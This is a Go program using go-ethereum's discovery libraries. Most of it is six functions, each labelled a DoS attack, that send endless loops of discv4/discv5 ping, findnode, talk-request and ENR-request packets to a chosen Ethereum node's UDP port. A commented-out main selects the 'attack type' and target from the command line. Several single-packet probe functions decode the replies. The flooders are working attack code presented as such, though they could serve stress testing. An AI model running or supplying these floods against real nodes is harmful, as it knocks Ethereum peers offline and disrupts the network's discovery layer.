package main

import (
	"crypto/ecdsa"
	"crypto/rand"
	"fmt"
	"net"
	"time"

	"github.com/ethereum/go-ethereum/common/mclock"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/p2p/discover"
	"github.com/ethereum/go-ethereum/p2p/discover/v4wire"
	"github.com/ethereum/go-ethereum/p2p/discover/v5wire"
	"github.com/ethereum/go-ethereum/p2p/enode"
	"github.com/ethereum/go-ethereum/p2p/enr"
)

// PingDOS implements a DoS attack by sending rapid ping messages
func PingDOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Print local node ID (full hex string)
	log.Info("PingDOS: Created local node", "nodeID", ln.ID().String())

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	for {
		ping := &v5wire.Ping{
			ReqID:  make([]byte, 8),
			ENRSeq: uint64(time.Now().Unix()),
		}
		rand.Read(ping.ReqID)

		// Encode and send ping
		packet, _, err := codec.Encode(node.ID(), addr.String(), ping, nil)
		if err != nil {
			return fmt.Errorf("failed to encode ping: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send ping: %v", err)
		}
	}
}

// FindnodeDOS implements a DoS attack by sending rapid findnode requests
func FindnodeDOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Print local node ID (full hex string)
	log.Info("FindnodeDOS: Created local node", "nodeID", ln.ID().String())

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	var i uint
	for {
		findnode := &v5wire.Findnode{
			ReqID:     make([]byte, 8),
			Distances: []uint{i % 256},
			OpID:      uint64(i),
		}
		rand.Read(findnode.ReqID)

		// Encode and send findnode
		packet, _, err := codec.Encode(node.ID(), addr.String(), findnode, nil)
		if err != nil {
			return fmt.Errorf("failed to encode findnode: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send findnode: %v", err)
		}
		i++
	}
}

// TalkRequestDOS implements a DoS attack by sending rapid talk requests
func TalkRequestDOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Print local node ID (full hex string)
	log.Info("TalkRequestDOS: Created local node", "nodeID", ln.ID().String())

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	for {
		talk := &v5wire.TalkRequest{
			ReqID:    make([]byte, 8),
			Protocol: "test-protocol",
			Message:  make([]byte, 1024), // Large message
		}
		rand.Read(talk.ReqID)
		rand.Read(talk.Message)

		// Encode and send talk request
		packet, _, err := codec.Encode(node.ID(), addr.String(), talk, nil)
		if err != nil {
			return fmt.Errorf("failed to encode talk request: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send talk request: %v", err)
		}
	}
}

// PingV4DOS implements a DoS attack by sending rapid v4 ping messages
func PingV4DOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Print local node ID derived from private key (full hex string)
	nodeID := enode.PubkeyToIDV4(&privkey.PublicKey)
	log.Info("PingV4DOS: Created local node", "nodeID", nodeID.String())

	var i uint64
	for {
		ping := &v4wire.Ping{
			Version:    4,
			From:       v4wire.Endpoint{IP: net.IP{127, 0, 0, 1}, UDP: 30303, TCP: 30303},
			To:         v4wire.Endpoint{IP: node.IP(), UDP: uint16(node.UDP()), TCP: uint16(node.TCP())},
			Expiration: uint64(time.Now().Add(20 * time.Second).Unix()),
			ENRSeq:     i,
		}

		// Encode and send ping
		packet, _, err := v4wire.Encode(privkey, ping)
		if err != nil {
			return fmt.Errorf("failed to encode ping: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send ping: %v", err)
		}
		i++
	}
}

// FindnodeV4DOS implements a DoS attack by sending rapid v4 findnode requests
func FindnodeV4DOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Print local node ID derived from private key (full hex string)
	nodeID := enode.PubkeyToIDV4(&privkey.PublicKey)
	log.Info("FindnodeV4DOS: Created local node", "nodeID", nodeID.String())

	for {
		// Create a random target public key
		var target v4wire.Pubkey
		rand.Read(target[:])

		findnode := &v4wire.Findnode{
			Target:     target,
			Expiration: uint64(time.Now().Add(20 * time.Second).Unix()),
		}

		// Encode and send findnode
		packet, _, err := v4wire.Encode(privkey, findnode)
		if err != nil {
			return fmt.Errorf("failed to encode findnode: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send findnode: %v", err)
		}
	}
}

// ENRRequestV4DOS implements a DoS attack by sending rapid v4 ENR requests
func ENRRequestV4DOS(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Print local node ID derived from private key (full hex string)
	nodeID := enode.PubkeyToIDV4(&privkey.PublicKey)
	log.Info("ENRRequestV4DOS: Created local node", "nodeID", nodeID.String())

	for {
		enrReq := &v4wire.ENRRequest{
			Expiration: uint64(time.Now().Add(20 * time.Second).Unix()),
		}

		// Encode and send ENR request
		packet, _, err := v4wire.Encode(privkey, enrReq)
		if err != nil {
			return fmt.Errorf("failed to encode ENR request: %v", err)
		}
		if _, err := conn.Write(packet); err != nil {
			return fmt.Errorf("failed to send ENR request: %v", err)
		}
	}
}

// PingSingle sends a single v5 ping and waits for a pong response
func PingSingle(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	// Create and send ping
	ping := &v5wire.Ping{
		ReqID:  make([]byte, 8),
		ENRSeq: uint64(time.Now().Unix()),
	}
	rand.Read(ping.ReqID)

	packet, _, err := codec.Encode(node.ID(), addr.String(), ping, nil)
	if err != nil {
		return fmt.Errorf("failed to encode ping: %v", err)
	}

	fmt.Printf("Sending Ping (v5) to %s\n", node.String())
	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("failed to send ping: %v", err)
	}

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Wait for response
	buf := make([]byte, 1280)
	n, err := conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Println("Response: TIMEOUT - No response received")
			return nil
		}
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Printf("Response: Received %d bytes\n", n)

	// Try to decode the response
	_, _, packet2, err := codec.Decode(buf[:n], addr.String())
	if err != nil {
		fmt.Printf("Response: Could not decode packet: %v\n", err)
		return nil
	}

	fmt.Printf("Response: Packet type: %T\n", packet2)
	if pong, ok := packet2.(*v5wire.Pong); ok {
		fmt.Printf("Response: PONG received - ENRSeq: %d, ReqID: %x\n", pong.ENRSeq, pong.ReqID)
	}

	return nil
}

// FindnodeSingle sends a single v5 findnode request and waits for response
func FindnodeSingle(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	// Create and send findnode
	findnode := &v5wire.Findnode{
		ReqID:     make([]byte, 8),
		Distances: []uint{256}, // Request nodes at distance 256
		OpID:      uint64(time.Now().Unix()),
	}
	rand.Read(findnode.ReqID)

	packet, _, err := codec.Encode(node.ID(), addr.String(), findnode, nil)
	if err != nil {
		return fmt.Errorf("failed to encode findnode: %v", err)
	}

	fmt.Printf("Sending Findnode (v5) to %s (distance: 256)\n", node.String())
	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("failed to send findnode: %v", err)
	}

	// Set read timeout - shorter timeout for quick test
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	// Wait for first response only
	buf := make([]byte, 1280)
	n, err := conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Println("Response: TIMEOUT - No response received")
			return nil
		}
		return fmt.Errorf("failed to read response: %v", err)
	}

	// Try to decode the response
	_, _, packet2, err := codec.Decode(buf[:n], addr.String())
	if err != nil {
		fmt.Printf("Response: Could not decode packet (%d bytes): %v\n", n, err)
		return nil
	}

	fmt.Printf("Response: Received %d bytes, Packet type: %T\n", n, packet2)

	if nodes, ok := packet2.(*v5wire.Nodes); ok {
		// Verify ReqID matches
		if string(nodes.ReqID) != string(findnode.ReqID) {
			fmt.Printf("Response: WARNING - ReqID mismatch!\n")
		}

		fmt.Printf("Response: NODES received - Total packets expected: %d\n", nodes.RespCount)
		fmt.Printf("Response: Nodes in this packet: %d\n", len(nodes.Nodes))

		for i, record := range nodes.Nodes {
			n, err := enode.New(enode.ValidSchemes, record)
			if err != nil {
				fmt.Printf("  Node %d: Invalid record - %v\n", i+1, err)
				continue
			}
			fmt.Printf("  Node %d: ID=%s, IP=%s, UDP=%d\n", i+1, n.ID().TerminalString(), n.IP(), n.UDP())
		}
		fmt.Println("Response: ✓ Node responded successfully")
	}

	return nil
}

// TalkRequestSingle sends a single v5 talk request and waits for response
func TalkRequestSingle(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Create a codec for encoding packets
	codec := v5wire.NewCodec(ln, privkey, mclock.System{}, nil)

	// Create and send talk request
	talk := &v5wire.TalkRequest{
		ReqID:    make([]byte, 8),
		Protocol: "test-protocol",
		Message:  []byte("Hello from single request test"),
	}
	rand.Read(talk.ReqID)

	packet, _, err := codec.Encode(node.ID(), addr.String(), talk, nil)
	if err != nil {
		return fmt.Errorf("failed to encode talk request: %v", err)
	}

	fmt.Printf("Sending TalkRequest (v5) to %s (protocol: %s)\n", node.String(), talk.Protocol)
	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("failed to send talk request: %v", err)
	}

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Wait for response
	buf := make([]byte, 1280)
	n, err := conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Println("Response: TIMEOUT - No response received")
			return nil
		}
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Printf("Response: Received %d bytes\n", n)

	// Try to decode the response
	_, _, packet2, err := codec.Decode(buf[:n], addr.String())
	if err != nil {
		fmt.Printf("Response: Could not decode packet: %v\n", err)
		return nil
	}

	fmt.Printf("Response: Packet type: %T\n", packet2)
	if resp, ok := packet2.(*v5wire.TalkResponse); ok {
		// Verify ReqID matches
		if string(resp.ReqID) != string(talk.ReqID) {
			fmt.Printf("Response: WARNING - ReqID mismatch! Expected: %x, Got: %x\n", talk.ReqID, resp.ReqID)
		} else {
			fmt.Printf("Response: TALK_RESPONSE received - ReqID matches: %x\n", resp.ReqID)
		}

		fmt.Printf("Response: Message length: %d bytes\n", len(resp.Message))
		if len(resp.Message) > 0 {
			// Try to print as string if it's printable
			printable := true
			for _, b := range resp.Message {
				if b < 32 || b > 126 {
					printable = false
					break
				}
			}
			if printable {
				fmt.Printf("Response: Message content: %s\n", string(resp.Message))
			} else {
				fmt.Printf("Response: Message content (hex): %x\n", resp.Message)
			}
		} else {
			fmt.Println("Response: Empty message")
		}
	}

	return nil
}

// PingV4Single sends a single v4 ping and waits for a pong response
func PingV4Single(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create and send ping
	ping := &v4wire.Ping{
		Version:    4,
		From:       v4wire.Endpoint{IP: net.IP{127, 0, 0, 1}, UDP: 30303, TCP: 30303},
		To:         v4wire.Endpoint{IP: node.IP(), UDP: uint16(node.UDP()), TCP: uint16(node.TCP())},
		Expiration: uint64(time.Now().Add(20 * time.Second).Unix()),
		ENRSeq:     1,
	}

	packet, hash, err := v4wire.Encode(privkey, ping)
	if err != nil {
		return fmt.Errorf("failed to encode ping: %v", err)
	}

	fmt.Printf("Sending Ping (v4) to %s\n", node.String())
	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("failed to send ping: %v", err)
	}

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Wait for response
	buf := make([]byte, 1280)
	n, err := conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Println("Response: TIMEOUT - No response received")
			return nil
		}
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Printf("Response: Received %d bytes\n", n)

	// Try to decode the response
	packet2, _, _, err := v4wire.Decode(buf[:n])
	if err != nil {
		fmt.Printf("Response: Could not decode packet: %v\n", err)
		return nil
	}

	fmt.Printf("Response: Packet type: %T\n", packet2)
	if pong, ok := packet2.(*v4wire.Pong); ok {
		fmt.Printf("Response: PONG received - ENRSeq: %d, ReplyTok: %x\n", pong.ENRSeq, pong.ReplyTok)
		if len(pong.ReplyTok) > 0 && len(hash) > 0 {
			fmt.Printf("Response: ReplyTok matches sent hash: %v\n", string(pong.ReplyTok) == string(hash))
		}
	}

	return nil
}

// FindnodeV4Single sends a single v4 findnode request and waits for response
func FindnodeV4Single(node *enode.Node) error {
	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create a local node database
	db, err := enode.OpenDB("")
	if err != nil {
		return fmt.Errorf("failed to open node database: %v", err)
	}
	defer db.Close()

	// Create local node
	ln := enode.NewLocalNode(db, privkey)
	ln.SetStaticIP(net.IP{127, 0, 0, 1})
	ln.Set(enr.UDP(30303))

	// Create UDP connection
	addr := &net.UDPAddr{IP: net.IPv4zero, Port: 0}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen UDP: %v", err)
	}
	defer conn.Close()

	// Set up logger (discard all logs)
	logger := log.NewLogger(log.DiscardHandler())

	// Create config
	cfg := discover.Config{
		PrivateKey: privkey,
		Log:        logger,
	}

	// Create UDPv4 instance
	udp, err := discover.ListenV4(conn, ln, cfg)
	if err != nil {
		return fmt.Errorf("failed to create UDPv4: %v", err)
	}
	defer udp.Close()

	fmt.Printf("Sending Findnode (v4) to %s\n", node.String())

	// Use the target node's public key as the target
	target := v4wire.EncodePubkey(node.Pubkey())

	// Test connectivity with Ping first
	fmt.Println("Testing connectivity with Ping...")
	pong, err := udp.Ping(node)
	if err != nil {
		fmt.Printf("Ping failed: %v\n", err)
		fmt.Println("Trying Findnode anyway...")
	} else {
		fmt.Printf("Ping successful! ENRSeq: %d\n", pong.ENRSeq)
	}

	// Perform lookup which internally uses findnode
	fmt.Printf("Performing lookup for target: %x\n", target[:8])

	// Get public key from node
	var pubkey ecdsa.PublicKey
	if err := node.Load((*enode.Secp256k1)(&pubkey)); err != nil {
		return fmt.Errorf("failed to get public key: %v", err)
	}

	results := udp.LookupPubkey(&pubkey)

	fmt.Printf("Response: Found %d nodes\n", len(results))
	for i, n := range results {
		if i >= 10 { // Limit output to first 10 nodes
			fmt.Printf("  ... and %d more nodes\n", len(results)-10)
			break
		}
		fmt.Printf("  Node %d: ID=%s, IP=%s, UDP=%d\n", i+1, n.ID().TerminalString(), n.IP(), n.UDP())
	}

	if len(results) > 0 {
		fmt.Println("Response: ✓ Node responded successfully")
	} else {
		fmt.Println("Response: No nodes found")
	}

	return nil
}

// ENRRequestV4Single sends a single v4 ENR request and waits for response
func ENRRequestV4Single(node *enode.Node) error {
	addr := &net.UDPAddr{
		IP:   node.IP(),
		Port: node.UDP(),
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer conn.Close()

	// Generate a random private key for this session
	privkey, err := crypto.GenerateKey()
	if err != nil {
		return fmt.Errorf("failed to generate key: %v", err)
	}

	// Create and send ENR request
	enrReq := &v4wire.ENRRequest{
		Expiration: uint64(time.Now().Add(20 * time.Second).Unix()),
	}

	packet, hash, err := v4wire.Encode(privkey, enrReq)
	if err != nil {
		return fmt.Errorf("failed to encode ENR request: %v", err)
	}

	fmt.Printf("Sending ENRRequest (v4) to %s\n", node.String())
	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("failed to send ENR request: %v", err)
	}

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	// Wait for response
	buf := make([]byte, 1280)
	n, err := conn.Read(buf)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			fmt.Println("Response: TIMEOUT - No response received")
			return nil
		}
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Printf("Response: Received %d bytes\n", n)

	// Try to decode the response
	packet2, _, _, err := v4wire.Decode(buf[:n])
	if err != nil {
		fmt.Printf("Response: Could not decode packet: %v\n", err)
		return nil
	}

	fmt.Printf("Response: Packet type: %T\n", packet2)
	if enrResp, ok := packet2.(*v4wire.ENRResponse); ok {
		// Verify the response token matches our request hash
		if len(enrResp.ReplyTok) > 0 && len(hash) > 0 {
			fmt.Printf("Response: ENR_RESPONSE received - ReplyTok matches: %v\n", string(enrResp.ReplyTok) == string(hash))
		} else {
			fmt.Printf("Response: ENR_RESPONSE received - ReplyTok: %x\n", enrResp.ReplyTok)
		}

		// Try to parse the ENR record
		respN, err := enode.New(enode.ValidSchemes, &enrResp.Record)
		if err == nil {
			fmt.Printf("Response: ENR loaded successfully - Seq: %d, Node ID: %s\n", respN.Seq(), respN.ID())
			// Verify node ID matches the target
			if respN.ID() != node.ID() {
				fmt.Printf("Response: WARNING - Node ID mismatch! Expected: %s, Got: %s\n", node.ID(), respN.ID())
			}
			// Check if the response record is newer
			if respN.Seq() > node.Seq() {
				fmt.Printf("Response: Record is newer (remote seq: %d > local seq: %d)\n", respN.Seq(), node.Seq())
			} else if respN.Seq() < node.Seq() {
				fmt.Printf("Response: Record is older (remote seq: %d < local seq: %d)\n", respN.Seq(), node.Seq())
			} else {
				fmt.Printf("Response: Record has same sequence number: %d\n", respN.Seq())
			}
		} else {
			fmt.Printf("Response: Failed to parse ENR: %v\n", err)
		}
	}

	return nil
}

//func runDevp2pDOS() {
//	if len(os.Args) < 3 {
//		fmt.Println("Usage: go run devp2p.go <attack_type> <target_node>")
//		os.Exit(1)
//	}
//
//	attackType := os.Args[1]
//	targetNode := os.Args[2]
//
//	// Parse the target node
//	node, err := enode.Parse(enode.ValidSchemes, targetNode)
//	if err != nil {
//		fmt.Printf("Invalid node URL: %v\n", err)
//		os.Exit(1)
//	}
//
//	// Run the appropriate attack or test
//	var attackErr error
//	switch attackType {
//	case "ping":
//		attackErr = PingDOS(node)
//	case "findnode":
//		attackErr = FindnodeDOS(node)
//	case "talk":
//		attackErr = TalkRequestDOS(node)
//	case "pingv4":
//		attackErr = PingV4DOS(node)
//	case "findnodev4":
//		attackErr = FindnodeV4DOS(node)
//	case "enrrequestv4":
//		attackErr = ENRRequestV4DOS(node)
//	case "ping-single":
//		attackErr = PingSingle(node)
//	case "findnode-single":
//		attackErr = FindnodeSingle(node)
//	case "talk-single":
//		attackErr = TalkRequestSingle(node)
//	case "pingv4-single":
//		attackErr = PingV4Single(node)
//	case "findnodev4-single":
//		attackErr = FindnodeV4Single(node)
//	case "enrrequestv4-single":
//		attackErr = ENRRequestV4Single(node)
//	default:
//		fmt.Printf("Unknown attack type: %s\n", attackType)
//		os.Exit(1)
//	}
//
//	if attackErr != nil {
//		fmt.Printf("Attack failed: %v\n", attackErr)
//		os.Exit(1)
//	}
//}
